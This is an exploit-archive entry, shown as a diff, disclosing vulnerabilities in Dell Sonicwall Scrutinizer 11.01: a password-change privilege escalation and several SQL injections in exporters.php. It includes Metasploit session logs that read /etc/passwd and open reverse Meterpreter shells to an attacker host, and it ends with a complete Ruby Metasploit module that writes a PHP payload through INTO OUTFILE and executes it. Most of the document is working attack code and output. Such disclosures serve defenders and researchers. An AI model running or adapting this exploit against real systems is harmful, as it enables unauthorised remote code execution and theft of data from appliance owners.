@@ -1,0 +1,297 @@
+id: 22431
+date: 07/12/2014
+title: Dell Sonicwall Scrutinizer 11.01 Code Execution / SQL Injection
+author: Brandon Perry
+cves: 
+
+Dell Scrutinizer 11.01 several vulnerabilities
+http://www.mysonicwall.com has a trial available.
+ 
+ 
+Dell Sonicwall Scrutinizer suffers from several SQL injections, many of which can end up with
+remote code execution. An attacker needs to be authenticated, but not as an administrator.
+However, that wouldn’t stop anyone since there is also a privilege escalation vulnerability in that
+any authenticated user can change any other user’s password, including the admin. One SQL
+injection, which a Metasploit module was provided for, requires this privilege escalation to reach
+since it exists in the new user mechanism only available to admins.
+ 
+Privilege escalation via password change mechanism
+———————————————————-
+When changing you password, you POST a request with a savePrefs variable. This variable is
+actually the id of the user whose password is being changed. By changing it to ‘1’, for instance,
+you will change the password for the person with an ID of 1 (which is always admin as far as I
+can tell).
+ 
+ 
+SQL injection in new user mechanism (requires admin)
+————————————————————-
+When creating a new user, the selectedUserGroup variable POSTed to /cgi-bin/admin.cgi is
+vulnerable to SQL injection that allows an attacker to read an arbitrary ﬁle from the FS.
+ 
+A Metasploit module was provided that exploits the above two vulnerabilities to escalate an
+arbitrary authenticated user to admin, which then will read /etc/passwd via the SQL injection.
+See auxiliary module scrutinizer_password_change.rb.
+ 
+ 
+msf auxiliary(scrutinizer_password_change) > show options
+ 
+Module options (auxiliary/gather/scrutinizer_password_change):
+ 
+Name Current Setting Required Description
+---- --------------- -------- -----------
+FILENAME /etc/passwd yes The ﬁle to read from the admin sqli
+PASSWORD password no The password to authenticate with
+Proxies no Use a proxy chain
+RHOST 192.168.1.99 yes The target address
+RPORT 80 yes The target port
+TARGETURI / yes Base Application path
+USERID 1 yes The ID of the user to have their password changed. 'admin' is
+always 1.
+USERNAME username no The username to authenticate as
+VHOST no HTTP server virtual host
+ 
+msf auxiliary(scrutinizer_password_change) > run
+ 
+[+] Log in with the user's name and the password 'passw0rd!'
+[+] Attempting to read ﬁle using 'admin' account: /etc/passwd
+[+] root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin!operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+plixer:x:500:500::/home/plixer:/bin/bash
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+rtkit:x:499:498:RealtimeKit:/proc:/sbin/nologin
+pulse:x:498:497:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+tcpdump:x:72:72::/:/sbin/nologin
+ 
+[*] Auxiliary module execution completed
+msf auxiliary(scrutinizer_password_change) >
+ 
+ 
+ 
+Within the appliance, you may see /home/plixer/scrutinizer/html/d4d/exporters.php. This script,
+which is used actively throughout the web UI, is riddled with SQL injections. You can read the
+ﬁle and see the way the programmer(s?) is building their SQL injections. I will detail some of the
+injections that I could exploit and achieve RCE with (with Metasploit modules).
+ 
+The changeUnit function is vulnerable to a UNION-based SQL injection in the user_id parameter
+which allows a remote user to write a ﬁle to the ﬁlesystem via the OUTFILE vector. We have
+write permissions on the folder from the sql injection, so a PHP script can be written to /home/
+plixer/scrutinizer/html/d4d/ and the code will be executed upon a GET. A metasploit module was
+provided for this. (see scrutinizer_changeunit_sqli_exec.rb)
+ 
+msf exploit(scrutinizer_changeunit_sqli_exec) > set RHOST 192.168.1.99
+RHOST => 192.168.1.99
+msf exploit(scrutinizer_changeunit_sqli_exec) > set USERNAME username
+USERNAME => username
+msf exploit(scrutinizer_changeunit_sqli_exec) > set PASSWORD password
+PASSWORD => password
+msf exploit(scrutinizer_changeunit_sqli_exec) > exploit
+ 
+[*] Started reverse handler on 192.168.1.31:4444
+[*] Sending stage (39848 bytes) to 192.168.1.99
+[*] Meterpreter session 3 opened (192.168.1.31:4444 -> 192.168.1.99:55077) at 2014-04-20
+12:18:22 -0500
+[+] Deleted /home/plixer/scrutinizer/html/d4d/q0Oe8orPuCgoBAgk.php
+ 
+meterpreter > sysinfo
+Computer : fdsafds
+OS : Linux fdsafds 2.6.32-358.11.1.el6.x86_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013
+x86_64
+Meterpreter : php/php
+meterpreter >
+ 
+ 
+ 
+The methodDetail function is vulnerable to a UNION-based SQL injection similar to the one
+above. The methodDetail parameter itself is what is vulnerable. A metasploit module that
+achieves RCE via this vector has been supplied. ( see scrutinizer_methoddetail_sqli_exec.rb)
+ 
+msf exploit(scrutinizer_methoddetail_sqli_exec) > set USERNAME username
+USERNAME => username
+msf exploit(scrutinizer_methoddetail_sqli_exec) > set PASSWORD password
+PASSWORD => password
+msf exploit(scrutinizer_methoddetail_sqli_exec) > set RHOST 192.168.1.99
+RHOST => 192.168.1.99
+msf exploit(scrutinizer_methoddetail_sqli_exec) > exploit
+!
+[*] Started reverse handler on 192.168.1.31:4444
+[*] Sending stage (39848 bytes) to 192.168.1.99
+[*] Meterpreter session 2 opened (192.168.1.31:4444 -> 192.168.1.99:55063) at 2014-04-20
+12:16:23 -0500
+[+] Deleted /home/plixer/scrutinizer/html/d4d/6QOILiKezqXHEU07.php
+ 
+meterpreter > sysinfo
+Computer : fdsafds
+OS : Linux fdsafds 2.6.32-358.11.1.el6.x86_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013
+x86_64
+Meterpreter : php/php
+meterpreter >
+ 
+ 
+The xcNetworkDetail function is vulnerable to a UNION-based SQL injection like the ones
+above. The xcNetworkDetail parameter is itself what is vulnerable. A metasploit module was
+provided for this. (see scrutinizer_xcnetworkdetail_sqli_exec.rb)
+ 
+msf exploit(scrutinizer_xcnetworkdetail_sqli_exec) > set RHOST 192.168.1.99
+RHOST => 192.168.1.99
+msf exploit(scrutinizer_xcnetworkdetail_sqli_exec) > set USERNAME username
+USERNAME => username
+msf exploit(scrutinizer_xcnetworkdetail_sqli_exec) > set PASSWORD password
+PASSWORD => password
+msf exploit(scrutinizer_xcnetworkdetail_sqli_exec) > exploit
+ 
+[*] Started reverse handler on 192.168.1.31:4444
+[*] Sending stage (39848 bytes) to 192.168.1.99
+[*] Meterpreter session 1 opened (192.168.1.31:4444 -> 192.168.1.99:55045) at 2014-04-20
+12:14:57 -0500
+[+] Deleted /home/plixer/scrutinizer/html/d4d/AJ7W4nC4TOpLuS4F.php
+ 
+meterpreter > sysinfo
+Computer : fdsafds
+OS : Linux fdsafds 2.6.32-358.11.1.el6.x86_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013
+x86_64
+Meterpreter : php/php
+meterpreter > 
+
+=======
+
+# This module requires Metasploit: http//metasploit.com/download
+##
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+  
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Dell Sonicwall Scrutinizer 11.01 Authenticated Code Execution",
+      'Description'    => %q{
+      Dell Sonicwall Scrutinizer 11.01 is vulnerable to an authenticated SQL injection that allows
+      an attacker to write arbitrary files to the file system. This vulnerability is used
+      to write a PHP script to the file system to gain RCE.
+
+      This was tested on the Dell Scrutinizer appliance available to download on mysonicwall.com
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [],
+      'References'     => [],
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [['Dell Sonicwall Scrutinizer 11.01', {}],],
+      'Privileged'     => false,
+      'DisclosureDate' => "",
+      'DefaultTarget'  => 0))
+
+      register_options(
+      [
+          OptString.new('TARGETURI', [ true, "Base Application path", "/" ]),
+          OptString.new('USERNAME', [ false,  "The username to authenticate as"]),
+          OptString.new('PASSWORD', [ false,  "The password to authenticate with" ])
+      ], self.class)
+  end
+
+  def exploit
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),
+      'vars_get' => {
+        'name' => datastore['USERNAME'],
+        'pwd' => datastore['PASSWORD']
+      }
+    })
+
+    res.body =~ /"userid":"(.*)","sessionid":"(.*)"/
+    sessionid = $2
+
+    cookie = "cookiesenabled=1;sessionid=#{sessionid};userid=#{$1}"
+
+    hexstr = ("<?php " + payload.encoded + " ?>").bytes.map { |b| sprintf("%02x",b) }.join
+
+    post = {
+      'ti' => 1,
+      'limit' => 25,
+      'page' => 0,
+      'order' => '',
+      'dir' => 'DESC',
+      'bbp' => 'percent',
+      'changeUnit' => '',
+      #should be trivial to support windows, just change the paths
+      'user_id' => "-9513 OR 9319=9319 LIMIT 0,1 INTO OUTFILE '/home/plixer/scrutinizer/html/d4d/#{sessionid}.php' LINES TERMINATED BY 0x#{hexstr}"
+    }
+
+    register_files_for_cleanup("/home/plixer/scrutinizer/html/d4d/#{sessionid}.php")
+
+    send_request_cgi({
+      'uri' => normalize_uri(target_uri, '/d4d/exporters.php'),
+      'method' => 'POST',
+      'vars_post' => post,
+      'cookie' => cookie
+    })
+
+    send_request_cgi({ 'uri' => normalize_uri(target_uri, "/d4d/#{sessionid}.php")})
+  end
+end
+
+__END__
+                        msf exploit(scrutinizer_sqli_exec) > show options
+
+                        Module options (exploit/dell/scrutinizer/scrutinizer_sqli_exec):
+
+                        Name       Current Setting  Required  Description
+                        ----       ---------------  --------  -----------
+                        PASSWORD   passw0rd!        no        The password to authenticate with
+                        Proxies                     no        Use a proxy chain
+                        RHOST      192.168.1.99     yes       The target address
+                        RPORT      80               yes       The target port
+                        TARGETURI  /                yes       Base Application path
+                        USERNAME   username         no        The username to authenticate as
+                        VHOST                       no        HTTP server virtual host
+
+
+                        Exploit target:
+
+                        Id  Name
+                        --  ----
+                        0   Dell Sonicwall Scrutinizer 11.01
+
+
+                        msf exploit(scrutinizer_sqli_exec) > exploit
+
+                        [*] Started reverse handler on 192.168.1.31:4444 
+                        [*] Sending stage (39195 bytes) to 192.168.1.99
+                        [*] Meterpreter session 1 opened (192.168.1.31:4444 -> 192.168.1.99:38133) at 2014-02-15 09:33:34 -0600
+
+                        meterpreter > shell
+                        Process 3038 created.
+                        Channel 0 created.
+                        id
+                        uid=48(apache) gid=48(apache) groups=48(apache),500(plixer)
+                        uname -a
+                        Linux fdsafdsafdsa 2.6.32-358.11.1.el6.x86_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
+
+#  0day.today [2023-03-27]  #
